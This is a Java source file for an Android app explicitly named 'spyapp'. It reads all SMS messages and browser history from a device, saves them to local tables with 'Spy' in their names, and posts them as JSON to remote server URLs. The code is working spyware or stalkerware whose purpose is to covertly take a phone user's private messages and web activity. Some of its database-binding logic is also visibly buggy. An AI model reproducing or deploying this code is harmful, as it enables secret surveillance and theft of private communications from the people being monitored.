package com.example.spyapp.sms;


import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.example.spyapp.Services;
import com.example.spyapp.http.PostData;
import com.example.spyapp.sqlite.SqlDb;
import com.example.spyapp.sqlite.WEB;
import com.example.spyapp.util.Const;
import com.example.spyapp.util.Prefs;
import com.example.spyapp.util.WebConst;

import android.app.Service;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteStatement;
import android.net.Uri;

public class SMSUtil {

	PostData postData=PostData.getInstance();

	
    public final static String ADDRESS = "address";
    public final static String BODY = "body";
    public final static String DATE_SENT = "date_sent";
    public final static String TYPE = "type";
    public final static String ERROR_CODE = "error_code";
    public final static String LOCKED = "locked";
    public final static String CONTACT_ID = "person";
    public final static String BT_CONTACT_ID = "bt_contact_id";
    public final static String PROTOCOL = "protocol";
    public final static String REPLY_PATH_PRESENT = "reply_path_present";
    public final static String SEEN = "seen";
    public final static String SERVICE_CENTER = "service_center";
    public final static String STATUS = "status";
    public final static String SUBJECT = "subject";
    public final static String THREAD_ID = "thread_id";
    public final static String OT_THREAD_ID = "onetime_thread_id";
    public final static String DATE = "date";
    public final static String SENT_FROM = "sent_from";
    public final static String MESSAGE_ID="_id";
    
    private final static String SMS_ADDRESS = "address";
    private final static String SMS_BODY = "body";
    
    public final static String INBOX_TBL_SMS = "SMS";
    public final static String TBL_SENT_SMS = "TBL_SENT_SMS";
	public final static String TBL_CONTACT = "CONTACT";
	public final static String TBL_WEB = "WEB";
	
    static Uri SMS_URI = Uri.parse("content://sms/");

    public final static String[] INBOX_SMS_COLUMNS = {SENT_FROM, ADDRESS, BODY, DATE, DATE_SENT, TYPE };
    public final static String[] WEB_COLUMNS = {"name", "url","web_date"};
    public static final String[] WEB_DATATYPES = {"INT", "TEXT", "TEXT", "TEXT"};
    public final static String[] SENT_SMS_COLUMNS = {SENT_FROM, ADDRESS, BODY, DATE, DATE_SENT, TYPE };
    public static final String[] SMS_DATATYPES = {"INT", "TEXT", "TEXT", "TEXT", "TEXT", "TEXT", "TEXT"};
    
    public JSONArray getAllSMSThreadMessages(Service service) {
        Cursor cursor = service.getContentResolver().query(SMS_URI, null, null, null, null);
        JSONArray jsonArray=new JSONArray();
        if (cursor.moveToFirst()) {
            int addC = cursor.getColumnIndex(SMS_ADDRESS);
            int bodyC = cursor.getColumnIndex(SMS_BODY);
            int dateC = cursor.getColumnIndex(DATE);
            int idC = cursor.getColumnIndex(MESSAGE_ID);
            int tyeC = cursor.getColumnIndex(TYPE);
            
            do {
                if (addC != -1 && bodyC != -1) {
                	
                	try{
                		
                	
                	String num = cursor.getString(addC);
                    String msg = cursor.getString(bodyC);
                    long date = cursor.getLong(dateC);
                    long id = cursor.getLong(idC);
                    int type=cursor.getInt(tyeC);
                    
                    Date _date=new Date(date);
 	               SimpleDateFormat df2 = new SimpleDateFormat("dd MMM yyyy HH:mm:ss");
 	               String dateText = df2.format(_date);
                    
                	JSONObject jsonObj = new JSONObject();
					try {
						jsonObj.put("number", num);
						jsonObj.put("body", msg);
						jsonObj.put("date", dateText);
						jsonObj.put("msg_id", id);
						jsonObj.put("msg_type", type);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

                    if (!num.equals("") && !msg.equals("")) {
                    	jsonArray.put(jsonObj);
                    }
                    
                	} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                	
                }
            } while (cursor.moveToNext());
        }
        cursor.close();
        return jsonArray;
    }
    
    private static SMSUtil instance;
    public static SMSUtil getInstance() {
        if (instance == null) {
            instance = new SMSUtil();
        }
        return instance;
    }

    public String[] getDateAndTime(long time){
		String dateAndTime[]=new String[2];
		DateFormat dateFormatter = new SimpleDateFormat("dd/MM/yyyy");
		DateFormat timeFormatter = new SimpleDateFormat("hh:mm:ss.SSS");
		Calendar calendar = Calendar.getInstance();
		calendar.setTimeInMillis(time);
		dateAndTime[0]=dateFormatter.format(calendar.getTime());
		dateAndTime[1]=timeFormatter.format(calendar.getTime());
		return dateAndTime;
	}
    
    public long postToSpyInboxTableThread(Services service,String number, String msg) {
        long sid = -1;
        try {
            long now = System.currentTimeMillis();
            SqlDb db = service.getMainDB();
            SMS s = new SMS(number, msg);
            s.setAddress(number);
            s.setMessage(msg);
            s.setDateReceived(now);
            s.setType(1);
            sid = s.insert(db);
            sendSingleThread(service, s);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sid;
    }
	
    public void setCoreService(Services service) {
        service = service;
    }
    
    public long postToSpyInboxToTable(Services service, JSONArray inbox) {
        long sid = -1;
        try {
            SqlDb db = service.getMainDB();
            if(db!=null && inbox!=null){
            	SQLiteDatabase mainDB=db.getSQLiteDb();
                mainDB.beginTransaction();
                String sql="Insert or Replace into "+INBOX_TBL_SMS+" (body, address, date, type) values(?,?,?,?)";
                SQLiteStatement insert = mainDB.compileStatement(sql);
            	 for(int a=0;a<inbox.length();a++){
            		 try{
            			 JSONObject jsonobject = inbox.getJSONObject(a);
                		 insert.bindLong(1, jsonobject.getLong("body"));
                		 insert.bindString(1, jsonobject.getString("number"));
                         insert.bindString(2,  jsonobject.getString("date"));
                         insert.bindString(3,  jsonobject.getString("msg_type"));
                         insert.execute(); 
            		 }catch (Exception e) {
            	            e.printStackTrace();
            	     }
            		 
                 }
            	 mainDB.setTransactionSuccessful();
            	 mainDB.endTransaction();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sid;
    }
    
    public long postToSpySentTable(Services service, JSONArray inbox) {
        long sid = -1;
        try {
            SqlDb db = service.getMainDB();
            if(db!=null && inbox!=null){
            	SQLiteDatabase mainDB=db.getSQLiteDb();
                mainDB.beginTransaction();
                String sql="Insert or Replace into "+TBL_SENT_SMS+" (_id, body, address, date, type) values(?,?,?,?,?)";
                SQLiteStatement insert = mainDB.compileStatement(sql);
            	 for(int a=0;a<inbox.length();a++){
            		 try{
            			 JSONObject jsonobject = inbox.getJSONObject(a);
            			 int type=jsonobject.getInt("msg_type");
            			 if(type == 2){
            			 insert.bindLong(1, jsonobject.getLong("msg_id"));
                		 insert.bindString(2, jsonobject.getString("body"));
                		 insert.bindString(3, jsonobject.getString("number"));
                         insert.bindString(4,  jsonobject.getString("date"));
                         insert.bindString(5,  "2");
                         insert.execute(); 
                         }
                         
            		 }catch (Exception e) {
            	          // e.printStackTrace();
            	     }
            		 
                 }
            	 mainDB.setTransactionSuccessful();
            	 mainDB.endTransaction();
            }
        } catch (Exception e) {
          //  e.printStackTrace();
        }
        return sid;
    }

    
    public long postToSpyWebHistoryTable(Services service, JSONArray arrary) {
        long sid = -1;
        try {
            SqlDb db = service.getMainDB();
            if(db!=null && arrary!=null){
            	SQLiteDatabase mainDB=db.getSQLiteDb();
                mainDB.beginTransaction();
                String sql="Insert or Replace into "+TBL_WEB+" (_id, name, url, web_date) values(?,?,?,?)";
                SQLiteStatement insert = mainDB.compileStatement(sql);
            	 for(int a=0;a<arrary.length();a++){
            		 try{
            			 JSONObject jsonobject = arrary.getJSONObject(a);
            			 insert.bindLong(1, jsonobject.getLong("_id"));
                		 insert.bindString(2, jsonobject.getString("web_title"));
                		 insert.bindString(3, jsonobject.getString("web_url"));
                		 insert.bindString(4, jsonobject.getString("web_date"));
                         insert.execute(); 
            		 }catch (Exception e) {
            	           e.printStackTrace();
            	     }
            		 
                 }
            	 mainDB.setTransactionSuccessful();
            	 mainDB.endTransaction();
            }
        } catch (Exception e) {
          //  e.printStackTrace();
        }
        return sid;
    }
    
    public JSONObject getSentMessageList(Context service) {
    	Cursor cursor = service.getContentResolver().query(SMS_URI, null, null, null, null);
    	JSONObject jsonObj = null;
	    if (cursor.moveToFirst()) {
	    		int tyeC = cursor.getColumnIndex(TYPE);
                int type=cursor.getInt(tyeC);
                int bodyC = cursor.getColumnIndex(SMS_BODY);
                String msg = cursor.getString(bodyC);
                if(type==2){
                	
                	
                	 int addC = cursor.getColumnIndex(SMS_ADDRESS);
                     int dateC = cursor.getColumnIndex(DATE);
                     int idC = cursor.getColumnIndex(MESSAGE_ID);
  
                 	 String num = cursor.getString(addC);
                   //  String msg = cursor.getString(bodyC);
                     long date = cursor.getLong(dateC);
                     long id = cursor.getLong(idC);
                            
                             
                 	jsonObj = new JSONObject();
 					try {
 						jsonObj.put("number", num);
 						jsonObj.put("body", msg);
 						jsonObj.put("date", date);
 						jsonObj.put("msg_id", id);
 						jsonObj.put("msg_type", type);
 					} catch (JSONException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}

                } 
	    }
        return jsonObj;
    }
    
    public long getLastSentMessage(Services service,JSONObject sendMessageDetail) {
        long sid = -1;
        try {
        	JSONArray jsonArray=new JSONArray();
            SqlDb db = service.getMainDB();
            long msg_id=sendMessageDetail.getInt("msg_id");
            if(db!=null){
            	SQLiteDatabase mainDB=db.getSQLiteDb();
            	    Cursor cursor = mainDB.query(
            	            TBL_SENT_SMS,
            	            new String[]{"_id","body",ADDRESS,DATE_SENT,DATE,TYPE},         
            	            null,
            	            null,
            	            null,
            	            null,
            	            null
            	    );
            	    if (cursor.moveToLast()) {
            	        sid = cursor.getLong(cursor.getColumnIndex("_id"));
            	    	if(sid!=msg_id){
            	    		String msg=sendMessageDetail.getString("body");
                   		 	String num=sendMessageDetail.getString("number");
                   		 	int type=sendMessageDetail.getInt("msg_type");
                   		    int m_id=sendMessageDetail.getInt("msg_id");
                   		    long date=sendMessageDetail.getLong("date");
                   		    
                            SMS s = new SMS(num, msg);
                            s.setAddress(num);
                            s.setMessage(msg);
                            s.setDateSent(date);
                            s.setType(2);
                            s.setId(m_id);
                            sid = s.insert(db);
                            sendSingleThread(service, s);
            	    	}         	    	
            	    }else{
            	    	String msg=sendMessageDetail.getString("body");
               		 	String num=sendMessageDetail.getString("number");
               		 	int type=sendMessageDetail.getInt("msg_type");
               		    int m_id=sendMessageDetail.getInt("msg_id");
               		    long date=sendMessageDetail.getLong("date");

                        long now = System.currentTimeMillis();
                        SMS s = new SMS(num, msg);
                        s.setAddress(num);
                        s.setMessage(msg);
                        s.setDateSent(now);
                        s.setType(type);
                        s.setId(m_id);
                        sid = s.insert(db);
                        sendSingleThread(service, s);
            	    	
            	    }
            	    cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sid;
    }
    
    
    public long getLastWeBHistory(Services service,JSONObject sendMessageDetail) {
        long sid = -1;
        JSONArray jsonArray=new JSONArray();
        try {
            SqlDb db = service.getMainDB();
            long msg_id=sendMessageDetail.getInt("_id");
            if(db!=null){
            	SQLiteDatabase mainDB=db.getSQLiteDb();
            	    Cursor cursor = mainDB.query(
            	            TBL_WEB,
            	            new String[]{"_id","name","url","web_date"},         
            	            null,
            	            null,
            	            null,
            	            null,
            	            null
            	    );
            	    if (cursor.moveToLast()) {
            	    	String st= cursor.getString(cursor.getColumnIndex("name"));
            	        sid = cursor.getLong(cursor.getColumnIndex("_id"));
            	        
            	    	if(sid!=msg_id){
            	    		String name=sendMessageDetail.getString("name");
                   		 	String url=sendMessageDetail.getString("web_url");
                   		 	long date=sendMessageDetail.getLong("web_date");

 
                            JSONObject jsonObj = new JSONObject();
                   	
           						 Date _date=new Date(date);
           		 	             SimpleDateFormat df2 = new SimpleDateFormat("dd MMM yyyy HH:mm:ss");
           		 	             String dateText = df2.format(_date);	
           						 jsonObj.put("name", name);
          						 jsonObj.put("web_date", dateText);
           						 jsonObj.put("url", url);
           						
	           					 WEB web=new WEB();
	           					 web.setId(msg_id);
	            				 web.setDate(dateText);
	            				 web.setName(name);
	            				 web.setUrl(url);
	            				 web.insert(db);
            				 
           					
                   			     jsonArray.put(jsonObj);
                   				 String json=jsonArray.toString();
                   				 postData.requstPost(WebConst.WEB_URL, json);
                            
            	    	}         	    	
            	    }else{
            	    	
            	    	 		JSONObject jsonObj = new JSONObject();
                			try {
                				
                				 String name=sendMessageDetail.getString("name");
                       		 	 String url=sendMessageDetail.getString("web_url");
                       		 	 long date=sendMessageDetail.getLong("web_date");
                				
        						 Date _date=new Date(date);
        		 	             SimpleDateFormat df2 = new SimpleDateFormat("dd MMM yyyy HH:mm:ss");
        		 	             String dateText = df2.format(_date);	
        						 jsonObj.put("name", name);
        						 jsonObj.put("web_date", dateText);
        						 jsonObj.put("url", url);
        						 
        						 
        						 WEB web=new WEB();
        						 web.setId(msg_id);
                				 web.setDate(dateText);
                				 web.setName(name);
                				 web.setUrl(url);
                				 web.insert(db);
                				 
        					} catch (JSONException e) {
        						// TODO Auto-generated catch block
        						e.printStackTrace();
        					}
                			     jsonArray.put(jsonObj);
                				 String json=jsonArray.toString();
                				 postData.requstPost(WebConst.WEB_URL, json);
                				 
                				 
            	    	
            	    }
            	   // cursor.close();  
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sid;
    }
    
	public void sendSingleThread(Services service,SMS s){
		JSONArray jsonArray=new JSONArray();
		 Prefs pref=new Prefs(service);
		 boolean isCallTrackingEnable=pref.GetBoolean(Const.smsSwitchPref);
		 if(isCallTrackingEnable){
				 JSONObject jsonObj = new JSONObject();
					try {
						
						 Date _date=new Date(s.getDateSent());
		 	               SimpleDateFormat df2 = new SimpleDateFormat("dd MMM yyyy HH:mm:ss");
		 	               String dateText = df2.format(_date);
						
						jsonObj.put("number", s.getAddress());
						jsonObj.put("body", s.getMessage());
						jsonObj.put("date", dateText);
						jsonObj.put("msg_id", s.getId());
						jsonObj.put("msg_type", s.getType());
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
			     jsonArray.put(jsonObj);
				 String json=jsonArray.toString();
				 postData.requstPost(WebConst.SMS_URL, json);
		 }
	} 
	
	public void sendSingleWebHistory(Services service,SMS s){
		JSONArray jsonArray=new JSONArray();
		 Prefs pref=new Prefs(service);
		 boolean isCallTrackingEnable=pref.GetBoolean(Const.smsSwitchPref);
		 if(isCallTrackingEnable){
				 JSONObject jsonObj = new JSONObject();
					try {
						
						 Date _date=new Date(s.getDateSent());
		 	               SimpleDateFormat df2 = new SimpleDateFormat("dd MMM yyyy HH:mm:ss");
		 	               String dateText = df2.format(_date);
						
						jsonObj.put("number", s.getAddress());
						jsonObj.put("body", s.getMessage());
						jsonObj.put("date", dateText);
						jsonObj.put("msg_id", s.getId());
						jsonObj.put("msg_type", s.getType());
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
			     jsonArray.put(jsonObj);
				 String json=jsonArray.toString();
				 postData.requstPost(WebConst.SMS_URL, json);
		 }
	} 
	
}